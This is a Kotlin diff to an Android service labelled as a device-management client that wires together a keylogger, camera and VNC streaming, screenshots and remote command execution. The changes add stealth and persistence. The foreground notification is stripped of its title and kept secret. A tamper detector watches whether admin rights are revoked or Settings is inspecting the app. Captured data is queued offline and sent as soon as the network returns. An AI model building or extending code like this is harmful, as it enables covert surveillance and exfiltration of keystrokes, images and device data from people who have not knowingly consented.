@@ -5,6 +5,10 @@ import android.app.PendingIntent
 import android.app.Service
 import android.content.Intent
 import android.content.pm.ServiceInfo
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
@@ -22,10 +26,13 @@ import com.mdm.client.keylogger.KeyloggerManager
 import com.mdm.client.media.*
 import com.mdm.client.network.ApiClient
 import com.mdm.client.network.CameraSocketClient
+import com.mdm.client.network.OfflineDataQueue
 import com.mdm.client.network.VncSocketClient
 import com.mdm.client.server.DeviceHttpServer
 import com.mdm.client.util.NetworkUtils
+import com.mdm.client.security.TamperDetector
 import com.mdm.client.workers.DataSyncWorker
+import com.mdm.client.workers.OfflineSyncWorker
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -38,7 +45,11 @@ class MdmForegroundService : Service() {
     companion object {
         private const val TAG = "SysSvc"
         const val ACTION_STOP = "com.mdm.client.STOP"
-        private const val COMMAND_POLL_INTERVAL_MS = 30_000L
+        // FCM is the primary command channel. Polling is a fallback only —
+        // runs every 5 minutes to catch any missed FCM messages.
+        private const val COMMAND_POLL_INTERVAL_MS = 300_000L
+        private const val MAX_BACKOFF_MS = 1_800_000L  // 30 min max backoff
+        private var currentBackoffMs = COMMAND_POLL_INTERVAL_MS
     }
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
@@ -60,9 +71,11 @@ class MdmForegroundService : Service() {
     lateinit var screenshotManager: ScreenshotManager
     lateinit var commandExecutor: CommandExecutor
     lateinit var commandQueue: CommandQueue
+    lateinit var tamperDetector: TamperDetector
     private lateinit var httpServer: DeviceHttpServer
 
     @Volatile private var isPolling = false
+    private var connectivityCallback: ConnectivityManager.NetworkCallback? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -85,6 +98,9 @@ class MdmForegroundService : Service() {
         schedulePeriodicWork()
         startCommandPolling()
         processQueuedCommands()
+        tamperDetector.startMonitoring()
+        startTamperCheckLoop()
+        registerConnectivityListener()
     }
 
     private fun initComponents() {
@@ -104,6 +120,7 @@ class MdmForegroundService : Service() {
         screenshotManager = ScreenshotManager(this, screenCapture)
         commandExecutor = CommandExecutor(this, apiClient)
         commandQueue = CommandQueue(this)
+        tamperDetector = TamperDetector(this)
 
         httpServer = DeviceHttpServer(
             context = this,
@@ -163,6 +180,11 @@ class MdmForegroundService : Service() {
             val deviceId = AppConfig.getDeviceId(this@MdmForegroundService)
             while (isPolling) {
                 try {
+                    // Refresh token if expired before polling
+                    if (AppConfig.isTokenExpired(this@MdmForegroundService)) {
+                        apiClient.refreshAccessToken()
+                    }
+
                     val pendingCommands = apiClient.pollPendingCommands(deviceId)
                     for (cmd in pendingCommands) {
                         val commandId = cmd.optInt("id", 0)
@@ -173,10 +195,17 @@ class MdmForegroundService : Service() {
                             commandExecutor.execute(commandId, commandType, payload)
                         }
                     }
+                    // Reset backoff on success
+                    currentBackoffMs = COMMAND_POLL_INTERVAL_MS
                 } catch (e: Exception) {
                     Log.e(TAG, "Command poll failed: ${e.message}")
+                    // Exponential backoff with jitter on failure
+                    currentBackoffMs = (currentBackoffMs * 2).coerceAtMost(MAX_BACKOFF_MS)
+                    val jitter = (Math.random() * currentBackoffMs * 0.1).toLong()
+                    delay(currentBackoffMs + jitter)
+                    continue
                 }
-                delay(COMMAND_POLL_INTERVAL_MS)
+                delay(currentBackoffMs)
             }
         }
     }
@@ -200,36 +229,121 @@ class MdmForegroundService : Service() {
         }
     }
 
-    private fun schedulePeriodicWork() {
-        val constraints = Constraints.Builder()
-            .setRequiredNetworkType(NetworkType.CONNECTED)
-            .build()
+    /**
+     * Periodically check for tampering every 60 seconds.
+     * Verifies admin status and checks if Settings is inspecting the app.
+     */
+    private fun startTamperCheckLoop() {
+        scope.launch {
+            while (isPolling) {
+                try {
+                    tamperDetector.checkAdminStatus()
+                    tamperDetector.checkForSettingsInspection()
+                } catch (_: Exception) {}
+                delay(60_000L)
+            }
+        }
+    }
 
-        val syncRequest = PeriodicWorkRequestBuilder<DataSyncWorker>(15, TimeUnit.MINUTES)
-            .setConstraints(constraints)
+    private fun schedulePeriodicWork() {
+        val wm = WorkManager.getInstance(this)
+
+        // Data collection runs regardless of connectivity — offline data is queued locally
+        val dataSyncRequest = PeriodicWorkRequestBuilder<DataSyncWorker>(15, TimeUnit.MINUTES)
             .setInitialDelay(1, TimeUnit.MINUTES)
             .build()
 
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+        wm.enqueueUniquePeriodicWork(
             "data_sync",
             ExistingPeriodicWorkPolicy.KEEP,
-            syncRequest
+            dataSyncRequest
+        )
+
+        // Offline queue drain — only runs when connected
+        val offlineSyncConstraints = Constraints.Builder()
+            .setRequiredNetworkType(NetworkType.CONNECTED)
+            .build()
+
+        val offlineSyncRequest = PeriodicWorkRequestBuilder<OfflineSyncWorker>(15, TimeUnit.MINUTES)
+            .setConstraints(offlineSyncConstraints)
+            .setInitialDelay(2, TimeUnit.MINUTES)
+            .build()
+
+        wm.enqueueUniquePeriodicWork(
+            OfflineSyncWorker.WORK_NAME,
+            ExistingPeriodicWorkPolicy.KEEP,
+            offlineSyncRequest
         )
     }
 
     private fun buildNotification(): Notification {
         return NotificationCompat.Builder(this, MdmApplication.NOTIFICATION_CHANNEL_ID)
             .setSmallIcon(android.R.drawable.ic_menu_manage)
-            .setContentTitle("System Services")
-            .setContentText("Running")
-            .setGroup("sys_group")
-            .setGroupSummary(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setSilent(true)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
             .build()
+    }
+
+    // ── Connectivity Listener ─────────────────────────────────────────────
+
+    /**
+     * Register a system-level connectivity callback. When internet becomes
+     * available again after an outage, immediately trigger the offline queue
+     * drain so queued data is delivered as fast as possible — don't wait for
+     * the next 15-minute WorkManager cycle.
+     */
+    private fun registerConnectivityListener() {
+        try {
+            val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
+            val request = NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
+                .build()
+
+            connectivityCallback = object : ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: Network) {
+                    Log.i(TAG, "Network available — checking offline queue")
+                    scope.launch {
+                        val queue = OfflineDataQueue(this@MdmForegroundService)
+                        val pending = queue.count()
+                        if (pending > 0) {
+                            Log.i(TAG, "Triggering immediate offline sync ($pending queued)")
+                            val syncRequest = OneTimeWorkRequestBuilder<OfflineSyncWorker>()
+                                .setConstraints(
+                                    Constraints.Builder()
+                                        .setRequiredNetworkType(NetworkType.CONNECTED)
+                                        .build()
+                                )
+                                .build()
+                            WorkManager.getInstance(this@MdmForegroundService)
+                                .enqueue(syncRequest)
+                        }
+                    }
+                }
+
+                override fun onLost(network: Network) {
+                    Log.w(TAG, "Network lost — data will be queued offline")
+                }
+            }
+
+            cm.registerNetworkCallback(request, connectivityCallback!!)
+            Log.i(TAG, "Connectivity listener registered")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to register connectivity listener: ${e.message}")
+        }
+    }
+
+    private fun unregisterConnectivityListener() {
+        try {
+            connectivityCallback?.let {
+                val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
+                cm.unregisterNetworkCallback(it)
+                connectivityCallback = null
+            }
+        } catch (_: Exception) {}
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -243,7 +357,9 @@ class MdmForegroundService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         isPolling = false
+        unregisterConnectivityListener()
         try {
+            tamperDetector.stopMonitoring()
             httpServer.stop()
             cameraSocketClient.disconnect()
             vncSocketClient.disconnect()
